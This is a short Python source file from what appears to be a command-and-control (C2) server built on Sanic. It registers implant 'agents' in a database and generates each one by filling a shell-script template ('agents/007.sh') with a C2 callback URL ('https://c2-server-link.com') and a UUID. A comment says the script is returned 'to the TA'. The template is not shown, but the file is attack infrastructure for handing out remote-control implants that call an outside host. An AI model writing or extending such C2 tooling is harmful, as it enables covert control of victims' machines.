# This is for agent management: create, read, update, and delete

import jwt, uuid, json, random
from sanic import Blueprint, text, response, Sanic
# from settings import JWT_SECRET
from auth import protected
from db.db import *

JWT_SECRET = None
bp = Blueprint("agent")

class Agent:
    def __init__(self):
        # self.hostname = hostname
        # self.ip = ip
        # self.port = port
        self.uuid = str(uuid.uuid4())
        self.random = random.randint(0,10000)

        new_agent = session.add(AgentModel(id = self.random,uuid = self.uuid))
        # session.add(new_agent)
        session.commit()

        # jwt = jwt.encode(
        #     {
        #         "uuid": self.uuid
        #     }, JWT_SECRET, algorithm = 'HS256'
        # )
        # return uuid

    def CreateAgent(self):
        script = open("agents/007.sh").read()
        script = script.replace(r"(server-py)", "https://c2-server-link.com")
        script = script.replace(r"(uuid)", self.uuid)
        # script = script.replace(r"(jwt)", self.jwt)

        return text(script) #return agent code to the TA


@bp.route("/create_agent", methods=["GET","POST"])
@protected
def create_agent(request):
    # Get details from request body and create agent
    agent = Agent()
    agent_code = agent.CreateAgent()

    return agent_code
    # return response.json(json.dumps(agent.uuid), json.dumps(agent_code))

    # Register agent

if __name__ == "__main__":
    JWT_SECRET = Sanic.get_app("C2").config.secrets["JWT_SECRET"]